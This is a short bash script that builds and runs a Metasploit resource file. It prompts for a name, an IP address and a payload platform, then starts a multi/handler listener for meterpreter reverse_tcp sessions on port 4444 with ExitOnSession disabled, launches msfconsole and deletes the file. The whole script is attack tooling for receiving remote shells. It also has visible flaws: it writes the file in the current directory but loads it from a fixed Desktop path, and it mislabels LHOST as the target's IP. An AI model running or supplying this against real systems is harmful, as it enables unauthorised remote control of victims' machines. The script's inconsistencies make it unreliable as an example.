#!/bin/bash

echo "Choose Name"
read m 
echo  "Target IP"
read ip
echo "Select Payload"
read p 
echo "-------------"
echo  "Name:$m"
echo  "Target:$ip"
echo  "Payload:$p"
echo "---------------"
touch ./$m
echo use exploit/multi/handler >> $m
echo set PAYLOAD $p/meterpreter/reverse_tcp >> $m
echo set LHOST $ip >> $m
echo set LPORT 4444 >>$m
echo set ExitOnSession false >> $m
echo exploit -j -z  >> $m

sudo chmod +755  ~/Desktop/ivdim/$m 
msfconsole -r ~/Desktop/ivdim/$m
echo "Cleaning up"
sudo rm -rf  ~/Desktop/ivdim/$m  
